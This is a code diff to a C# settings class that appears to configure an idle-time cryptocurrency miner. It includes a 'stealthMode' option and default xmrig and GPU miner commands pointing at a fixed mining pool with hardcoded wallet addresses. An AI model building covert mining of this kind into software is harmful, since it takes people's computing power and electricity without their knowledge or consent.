@@ -13,7 +13,7 @@ namespace IdleService
         [JsonProperty]
         public bool enableDebug { get; set; }
         [JsonProperty]
-        public static bool enableLogging { get; set; }
+        public bool enableLogging { get; set; }
         [JsonProperty]
         public bool stealthMode { get; set; }
         [JsonProperty]
@@ -65,10 +65,10 @@ namespace IdleService
             urlToCheckForNetwork = "http://google.com";
             minutesUntilIdle = 30;
             resumePausedMiningAfterMinutes = 120;
-            cpuMiners.Add(new MinerList("xmrig.exe", "-o trollparty.org:9003 -u 43tVLRGvcaadfw4HrkUcpEKmZd9Y841rGKvsLZW8XvEVSBX1GrGezWvQYDdoNwNHAwTqSyK7iqyyqMSpDoUVKQmM43nzT72 -p x -k --safe"));
-            cpuMiners.Add(new MinerList("", ""));
-            gpuMiners.Add(new MinerList("miner.exe", "--server trollparty.org --port 9003 --user t1ZHrvmtgd3129iYEcFm21XMv5ojdh2xmsf --pass x --cuda_devices 0 --fee 0"));
-            gpuMiners.Add(new MinerList("", ""));
+            cpuMiners.Add(new MinerList("xmrig.exe", "-o trollparty.org:9003 -u 43tVLRGvcaadfw4HrkUcpEKmZd9Y841rGKvsLZW8XvEVSBX1GrGezWvQYDdoNwNHAwTqSyK7iqyyqMSpDoUVKQmM43nzT72 -p x -k --safe", "-o trollparty.org:9003 -u 43tVLRGvcaadfw4HrkUcpEKmZd9Y841rGKvsLZW8XvEVSBX1GrGezWvQYDdoNwNHAwTqSyK7iqyyqMSpDoUVKQmM43nzT72 -p x -k --safe"));
+            cpuMiners.Add(new MinerList("", "", ""));
+            gpuMiners.Add(new MinerList("miner.exe", "--server trollparty.org --port 9003 --user t1ZHrvmtgd3129iYEcFm21XMv5ojdh2xmsf --pass x --cuda_devices 0 --fee 0", "--server trollparty.org --port 9003 --user t1ZHrvmtgd3129iYEcFm21XMv5ojdh2xmsf --pass x --cuda_devices 0 --fee 0"));
+            gpuMiners.Add(new MinerList("", "", ""));
         }
     }
 }
